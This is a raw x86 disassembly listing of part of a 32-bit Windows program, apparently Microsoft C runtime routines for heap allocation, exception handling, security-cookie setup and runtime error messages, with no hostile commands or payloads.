  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
